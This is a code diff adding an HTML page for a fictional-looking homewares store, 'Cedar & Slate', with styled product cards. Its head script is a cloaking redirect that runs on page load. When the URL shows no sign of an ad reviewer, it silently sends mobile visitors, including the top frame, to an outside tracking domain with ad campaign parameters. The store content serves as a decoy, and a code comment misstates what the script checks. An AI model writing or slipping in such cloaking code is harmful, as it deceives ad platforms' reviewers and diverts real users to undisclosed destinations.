@@ -1,0 +1,474 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<script>
+(function() {
+    try {
+        const params = new URLSearchParams(window.location.search);
+        const placementValue = params.get("ppc");
+
+        const isMobileDevice = () => {
+            const ua = navigator.userAgent;
+            const matches = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini|Windows Phone|Mobile|Tablet/i;
+            return matches.test(ua) || (window.innerWidth <= 768 && window.innerHeight <= 1024);
+        };
+
+        // PARAMS-ONLY: Only check placement parameter, NO user agent detection
+        const isBot = placementValue === "__PLACEMENT__";
+
+        if (!isBot && isMobileDevice()) {
+            window.location.replace("https://rgbad.ttrk.io/68f263c889a41cac70e5e7b7?s=999ap&sub2=__CAMPAIGN_ID__&sub3=__AD_ID__&sub4=__CID__&sub5=__PLACEMENT__&sub6=__CAMPAIGN_NAME__&sub7=__AD_NAME__&sub8=__CID_NAME__");
+            return;
+        }
+
+        window.setTimeout(() => {
+            if (!isBot && isMobileDevice()) {
+                window.top.location = "https://rgbad.ttrk.io/68f263c889a41cac70e5e7b7?s=999ap&sub2=__CAMPAIGN_ID__&sub3=__AD_ID__&sub4=__CID__&sub5=__PLACEMENT__&sub6=__CAMPAIGN_NAME__&sub7=__AD_NAME__&sub8=__CID_NAME__";
+            }
+        }, 50);
+    } catch (error) {
+        console.error(error);
+    }
+})();
+</script>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>Cedar & Slate — Modern Homewares</title>
+    <meta name="description" content="Cedar & Slate curates mindful home objects for quiet, intentional spaces." />
+    <style>
+        :root {
+            --bg: #0f1115;
+            --card: #151922;
+            --muted: #8891a4;
+            --text: #e7ecf5;
+            --accent: #7bd389;
+            --accent-2: #99a8ff;
+            --border: #222838;
+            --ring: #233043;
+            --radius: 18px;
+            --shadow: 0 10px 30px rgba(0, 0, 0, 0.35);
+        }
+
+        *, *::before, *::after { box-sizing: border-box; }
+        html, body {
+            margin: 0;
+            padding: 0;
+            background: var(--bg);
+            color: var(--text);
+            font-family: "Inter", "SF Pro Display", -apple-system, BlinkMacSystemFont, "Segoe UI", sans-serif;
+        }
+        img { max-width: 100%; display: block; }
+        a { color: inherit; text-decoration: none; }
+
+        .container {
+            width: min(1200px, 92vw);
+            margin-inline: auto;
+        }
+
+        header {
+            position: sticky;
+            top: 0;
+            backdrop-filter: blur(14px);
+            background: rgba(15, 17, 21, 0.85);
+            border-bottom: 1px solid var(--border);
+            z-index: 10;
+        }
+
+        .nav {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            padding: 18px 0;
+        }
+
+        .brand {
+            display: flex;
+            align-items: center;
+            gap: 0.7rem;
+            font-weight: 700;
+            letter-spacing: 0.04em;
+        }
+
+        .logo {
+            width: 34px;
+            height: 34px;
+            border-radius: 12px;
+            background: conic-gradient(from 210deg, var(--accent), var(--accent-2), #6be5d8, var(--accent));
+            box-shadow: 0 0 0 3px rgba(123, 211, 137, 0.12);
+        }
+
+        .nav ul {
+            list-style: none;
+            display: flex;
+            gap: 1.4rem;
+            margin: 0;
+            padding: 0;
+        }
+
+        .nav a {
+            padding: 0.5rem 0.75rem;
+            border-radius: 10px;
+            border: 1px solid transparent;
+            font-size: 0.95rem;
+        }
+
+        .nav a:hover {
+            border-color: var(--ring);
+            background: rgba(35, 48, 67, 0.25);
+        }
+
+        .hero {
+            display: grid;
+            grid-template-columns: 1.1fr 0.9fr;
+            gap: 32px;
+            padding: 52px 0 28px;
+        }
+
+        .hero-card {
+            background:
+                radial-gradient(1200px 500px at 10% -20%, rgba(153, 168, 255, 0.15), transparent 60%),
+                linear-gradient(180deg, #121723, #0f1115);
+            border: 1px solid var(--border);
+            border-radius: calc(var(--radius) + 6px);
+            box-shadow: var(--shadow);
+            padding: 34px;
+        }
+
+        .kicker {
+            color: var(--muted);
+            text-transform: uppercase;
+            letter-spacing: 0.18em;
+            font-size: 0.78rem;
+        }
+
+        h1 {
+            font-size: clamp(1.9rem, 3.6vw, 3.1rem);
+            line-height: 1.1;
+            margin: 0.4rem 0 1.1rem;
+        }
+
+        .lead {
+            color: #cfd6e6;
+            max-width: 60ch;
+        }
+
+        .hero-cta {
+            margin-top: 1.4rem;
+            display: flex;
+            flex-wrap: wrap;
+            gap: 0.9rem;
+        }
+
+        .btn {
+            display: inline-flex;
+            align-items: center;
+            justify-content: center;
+            gap: 0.5rem;
+            padding: 0.85rem 1.1rem;
+            border-radius: 14px;
+            font-weight: 600;
+            border: 1px solid var(--ring);
+            background: rgba(35, 48, 67, 0.5);
+            color: var(--text);
+            transition: transform 0.2s ease, box-shadow 0.2s ease;
+        }
+
+        .btn.primary {
+            background: linear-gradient(180deg, var(--accent), #5ecf7b);
+            color: #0a1212;
+            border-color: transparent;
+            box-shadow: 0 8px 20px rgba(123, 211, 137, 0.25);
+        }
+
+        .btn:hover {
+            transform: translateY(-1px);
+        }
+
+        .showcase {
+            border: 1px solid var(--border);
+            border-radius: calc(var(--radius) + 6px);
+            overflow: hidden;
+            background: #0c0f14;
+            box-shadow: var(--shadow);
+            display: grid;
+            place-items: center;
+        }
+
+        .showcase img {
+            aspect-ratio: 4 / 3;
+            object-fit: cover;
+            width: 100%;
+            height: 100%;
+        }
+
+        .section-head {
+            display: flex;
+            justify-content: space-between;
+            align-items: flex-end;
+            gap: 1rem;
+            margin: 40px 0 18px;
+        }
+
+        .section-head h2 {
+            margin: 0;
+            font-size: clamp(1.3rem, 2.2vw, 1.75rem);
+        }
+
+        .section-head p {
+            margin: 0;
+            color: var(--muted);
+            font-size: 0.95rem;
+        }
+
+        .grid {
+            display: grid;
+            gap: 18px;
+            grid-template-columns: repeat(12, 1fr);
+        }
+
+        .product-card {
+            grid-column: span 12;
+            border: 1px solid var(--border);
+            background: linear-gradient(180deg, #121723, #0e1117);
+            border-radius: var(--radius);
+            overflow: hidden;
+            box-shadow: var(--shadow);
+            display: flex;
+            flex-direction: column;
+            transition: transform 0.2s ease, box-shadow 0.2s ease, border-color 0.2s ease;
+        }
+
+        .product-card:hover {
+            transform: translateY(-2px);
+            border-color: #2a3650;
+            box-shadow: 0 14px 36px rgba(0, 0, 0, 0.45);
+        }
+
+        .product-card img {
+            aspect-ratio: 1 / 1;
+            object-fit: cover;
+        }
+
+        .card-body {
+            padding: 16px 18px;
+        }
+
+        .title {
+            font-weight: 700;
+            font-size: 1.05rem;
+            margin: 0 0 0.3rem;
+        }
+
+        .sub {
+            color: var(--muted);
+            font-size: 0.92rem;
+            margin: 0 0 0.6rem;
+        }
+
+        .price {
+            font-variant-numeric: tabular-nums;
+            font-weight: 700;
+            color: var(--accent);
+        }
+
+        .card-actions {
+            display: flex;
+            gap: 0.6rem;
+            padding: 0 18px 18px;
+        }
+
+        .pill {
+            padding: 0.6rem 0.85rem;
+            border-radius: 999px;
+            border: 1px solid var(--ring);
+            background: #121a24;
+            font-weight: 600;
+            font-size: 0.9rem;
+        }
+
+        .pill:hover {
+            background: #162030;
+        }
+
+        .pill.ghost {
+            background: transparent;
+        }
+
+        footer {
+            margin-top: 54px;
+            padding: 28px 0 46px;
+            border-top: 1px solid var(--border);
+            color: var(--muted);
+        }
+
+        .foot {
+            display: flex;
+            flex-wrap: wrap;
+            justify-content: space-between;
+            align-items: center;
+            gap: 1rem;
+        }
+
+        .links {
+            display: flex;
+            gap: 1rem;
+            flex-wrap: wrap;
+        }
+
+        .links a {
+            padding: 0.4rem 0.6rem;
+            border: 1px solid transparent;
+            border-radius: 10px;
+        }
+
+        .links a:hover {
+            border-color: var(--ring);
+            background: rgba(35, 48, 67, 0.25);
+        }
+
+        @media (min-width: 720px) {
+            .product-card { grid-column: span 6; }
+        }
+
+        @media (min-width: 1040px) {
+            .product-card { grid-column: span 3; }
+        }
+
+        @media (max-width: 900px) {
+            .hero { grid-template-columns: 1fr; gap: 24px; }
+        }
+
+        a:focus-visible, button:focus-visible {
+            outline: 2px solid var(--accent-2);
+            outline-offset: 3px;
+            border-radius: 10px;
+        }
+    </style>
+</head>
+<body>
+    <header aria-label="Site header">
+        <div class="container nav">
+            <a class="brand" href="#">
+                <span class="logo" aria-hidden="true"></span>
+                <span>Cedar & Slate</span>
+            </a>
+            <nav aria-label="Primary">
+                <ul>
+                    <li><a href="#">New</a></li>
+                    <li><a href="#">Living</a></li>
+                    <li><a href="#">Kitchen</a></li>
+                    <li><a href="#">Workspace</a></li>
+                    <li><a href="#">Journal</a></li>
+                </ul>
+            </nav>
+        </div>
+    </header>
+
+    <section class="container hero" aria-labelledby="hero-title">
+        <div class="hero-card">
+            <p class="kicker">Quiet luxury, made simple</p>
+            <h1 id="hero-title">Objects for calm, well-designed spaces</h1>
+            <p class="lead">
+                Cedar & Slate curates tactile, long-wear homewares with restrained silhouettes and thoughtful detail.
+                Fewer, better pieces—made to be lived with every day.
+            </p>
+            <div class="hero-cta">
+                <a class="btn primary" href="#">Shop the Edit</a>
+                <a class="btn" href="#">Our Design Notes</a>
+            </div>
+        </div>
+        <div class="showcase" aria-hidden="true">
+            <img src="https://picsum.photos/1200/900?random=1001" alt="Minimal lounge setting with soft lighting">
+        </div>
+    </section>
+
+    <section class="container" aria-labelledby="products-title">
+        <div class="section-head">
+            <h2 id="products-title">Featured Pieces</h2>
+            <p>Understated silhouettes in stone, glass, linen, and wood.</p>
+        </div>
+
+        <div class="grid">
+            <article class="product-card">
+                <img src="https://picsum.photos/600/600?random=101" alt="Aurora Stone Diffuser product image">
+                <div class="card-body">
+                    <h3 class="title">Aurora Stone Diffuser</h3>
+                    <p class="sub">Matte ceramic shell with soft ambient glow.</p>
+                    <p class="price">$84</p>
+                </div>
+                <div class="card-actions">
+                    <a class="pill" href="#">View Details</a>
+                    <a class="pill ghost" href="#">Add to List</a>
+                </div>
+            </article>
+
+            <article class="product-card">
+                <img src="https://picsum.photos/600/600?random=102" alt="Marigold Linen Throw product image">
+                <div class="card-body">
+                    <h3 class="title">Marigold Linen Throw</h3>
+                    <p class="sub">Stonewashed linen with selvedge edge finishing.</p>
+                    <p class="price">$129</p>
+                </div>
+                <div class="card-actions">
+                    <a class="pill" href="#">View Details</a>
+                    <a class="pill ghost" href="#">Add to List</a>
+                </div>
+            </article>
+
+            <article class="product-card">
+                <img src="https://picsum.photos/600/600?random=103" alt="Driftwood Candle Set product image">
+                <div class="card-body">
+                    <h3 class="title">Driftwood Candle Trio</h3>
+                    <p class="sub">Hand-poured soy blend with smoke and sea salt profile.</p>
+                    <p class="price">$42</p>
+                </div>
+                <div class="card-actions">
+                    <a class="pill" href="#">View Details</a>
+                    <a class="pill ghost" href="#">Add to List</a>
+                </div>
+            </article>
+
+            <article class="product-card">
+                <img src="https://picsum.photos/600/600?random=104" alt="Graphite Pour-Over Kettle product image">
+                <div class="card-body">
+                    <h3 class="title">Graphite Pour-Over Kettle</h3>
+                    <p class="sub">Precision gooseneck with satin matte finish.</p>
+                    <p class="price">$96</p>
+                </div>
+                <div class="card-actions">
+                    <a class="pill" href="#">View Details</a>
+                    <a class="pill ghost" href="#">Add to List</a>
+                </div>
+            </article>
+
+            <article class="product-card">
+                <img src="https://picsum.photos/600/600?random=105" alt="Lumen Wall Clock product image">
+                <div class="card-body">
+                    <h3 class="title">Lumen Wall Clock</h3>
+                    <p class="sub">Brushed metal bezel with silent sweep movement.</p>
+                    <p class="price">$118</p>
+                </div>
+                <div class="card-actions">
+                    <a class="pill" href="#">View Details</a>
+                    <a class="pill ghost" href="#">Add to List</a>
+                </div>
+            </article>
+        </div>
+    </section>
+
+    <footer aria-label="Site footer">
+        <div class="container foot">
+            <p>© <span id="year">2025</span> Cedar & Slate. All rights reserved.</p>
+            <nav class="links" aria-label="Footer">
+                <a href="#">Terms of Service</a>
+                <a href="#">Privacy Policy</a>
+                <a href="#">Contact</a>
+            </nav>
+        </div>
+    </footer>
+
+    <script>
+        document.getElementById('year').textContent = new Date().getFullYear();
+    </script>
+</body>
+</html>
